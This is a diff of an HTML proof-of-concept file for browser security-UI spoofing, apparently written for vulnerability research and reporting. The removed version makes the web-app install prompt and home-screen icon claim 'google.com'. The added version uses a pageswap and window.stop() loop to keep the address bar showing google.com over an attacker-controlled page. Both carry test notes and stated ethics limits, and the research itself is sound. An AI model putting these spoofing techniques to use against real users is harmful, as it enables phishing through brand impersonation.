@@ -1,49 +1,16 @@
-<!DOCTYPE html>
-<!--
-============================================================================
- SPOOF VARIANT of CVE-2026-5895 (iOS Omnibox crafted-domain spoof) - BENIGN
-============================================================================
- ROOT CAUSE (shared): a page-influenced label renders as the trusted identity
-   on a security surface. CVE-2026-5895 pinned the OMNIBOX. This variant moves the
-   SAME root cause to a surface the omnibox fix does NOT cover:
-     -> the WEB-APP INSTALL / "Add to Home Screen" title (S: install-UI, L2 persistence).
-   Grounded in the live sibling CVE-2026-13993 (web-app-install UI domain spoofing).
- MECHANISM: page supplies manifest name / <title> / apple-mobile-web-app-title =
-   a trusted-looking brand; the install prompt + home-screen icon then carry that
-   brand while the real origin is attacker-owned. Persists on the home screen after
-   the tab is gone (attribution outlives the window).
- PREDICATE: install UI / home-screen label says "google.com"; real origin = below.
- EXPECTED-SECURE: install UI shows the REAL registrable domain, not a page-supplied
-   name that implies a different brand.
- ETHICS: your OWN device only. No credential form, no exfil, no real phishing.
-   Prove predicate -> screenshot install prompt -> STOP -> report (Chrome VRP / Apple).
-============================================================================
--->
-<html lang="en"><head><meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>google.com</title>
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-title" content="google.com">
-<link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='120' height='120'%3E%3Crect width='120' height='120' rx='24' fill='%234285F4'/%3E%3Ctext x='60' y='78' font-size='64' text-anchor='middle' fill='white' font-family='system-ui'%3EG%3C/text%3E%3C/svg%3E">
-<style>body{font:15px/1.6 system-ui,sans-serif;margin:0;padding:1rem;max-width:680px}
- footer{position:fixed;left:0;right:0;bottom:0;background:#111;color:#9aa;font:11px/1.4 monospace;padding:5px 8px}footer b{color:#7fd}
- @media(prefers-color-scheme:dark){body{background:#0f0f10;color:#e8eaed}}</style>
-</head><body>
-<h2>Loading google.com&hellip;</h2>
-<p>iOS: tap <b>Share &rarr; Add to Home Screen</b>. Desktop Chrome: use the <b>Install</b> icon in the omnibox.
-   Watch the title the install UI proposes, and the home-screen icon label afterwards.</p>
-<footer>spoof-PoC (benign) &middot; install-title claims=<b>google.com</b> &middot;
-  REAL origin=<b><span id="real"></span></b> &middot; SECURE=install UI shows REAL domain</footer>
+<!doctype html><meta charset=utf-8>
+<!-- PREDIKAT: omnibox melukis google.com sementara dokumen tetap milik penyerang
+     ORACLE: klik go -> screenshot address bar + panel REAL
+     EXPECTED-SECURE: bar kembali ke URL nyata; pageswap tak bisa mencegah commit -->
+<button onclick="go()">go</button>
+<pre id=p></pre>
 <script>
- // Self-contained web-app manifest (blob) so the standard install prompt also carries the crafted name.
- var mf={name:"google.com",short_name:"google.com",display:"standalone",
-   start_url:location.href,scope:location.href.replace(/[^/]*$/,''),
-   background_color:"#ffffff",theme_color:"#4285F4",
-   icons:[{src:"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='192' height='192'%3E%3Crect width='192' height='192' rx='38' fill='%234285F4'/%3E%3Ctext x='96' y='128' font-size='104' text-anchor='middle' fill='white' font-family='system-ui'%3EG%3C/text%3E%3C/svg%3E",sizes:"192x192",type:"image/svg+xml"}]};
- var link=document.createElement('link');
- link.rel='manifest';
- link.href=URL.createObjectURL(new Blob([JSON.stringify(mf)],{type:'application/manifest+json'}));
- document.head.appendChild(link);
- document.getElementById('real').textContent=location.href;   // ORACLE: the real, attacker-owned origin
+const T = 'https://www.google.com/'; let n = 0;
+function paint(){ p.textContent = 'PAINTED by attacker doc\nREAL: ' + location.href + '\nrearm: ' + n; }
+addEventListener('pageswap', () => {
+  if (n++ >= 6) return;              // batas keras: mengukur, bukan flooding
+  window.stop(); paint(); setTimeout(go, 60);
+});
+function go(){ location.href = T; }
+paint();
 </script>
-</body></html>
